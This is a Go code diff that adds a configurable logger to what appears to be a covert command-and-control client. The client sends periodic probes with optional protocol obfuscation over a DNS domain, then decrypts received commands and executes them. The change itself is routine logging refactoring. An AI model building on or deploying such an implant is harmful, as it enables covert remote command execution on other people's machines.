@@ -27,6 +27,7 @@ func NewClient(opts ...Option) (*Client, error) {
 		Interval: 30 * time.Second, // Default 30 seconds interval
 		Protocol: ProtocolNone,     // Default no obfuscation
 		Domain:   "baidu.com",      // Default DNS domain
+		Logger:   logrus.New(),     // Default logger
 	}
 
 	for _, opt := range opts {
@@ -101,6 +102,13 @@ func WithClientDomain(domain string) Option {
 	}
 }
 
+// WithClientLogger sets the logger for client output
+func WithClientLogger(logger *logrus.Logger) Option {
+	return func(cfg *Config) {
+		cfg.Logger = logger
+	}
+}
+
 // Start begins the client's probe cycle
 func (c *Client) Start() error {
 	defer c.conn.Close()
@@ -111,10 +119,10 @@ func (c *Client) Start() error {
 			return nil
 		default:
 			if err := c.sendProbe(); err != nil {
-				logrus.Debugf("Client failed to send probe: %v", err)
+				c.config.Logger.Debugf("Client failed to send probe: %v", err)
 			}
 			if err := c.receiveResponse(); err != nil {
-				logrus.Debugf("Client failed to receive response: %v", err)
+				c.config.Logger.Debugf("Client failed to receive response: %v", err)
 			}
 			time.Sleep(c.config.Interval)
 		}
@@ -214,8 +222,8 @@ func (c *Client) handleCommand(encryptedCmd []byte) error {
 	}
 
 	cmdStr := string(decryptedCmd)
-	// Logging handled externally
-	logrus.Debugf("Client received command: %s", cmdStr)
+	// Logging handled through configured logger
+	c.config.Logger.Debugf("Client received command: %s", cmdStr)
 
 	// Execute command with 10-second timeout
 	result := "result:"
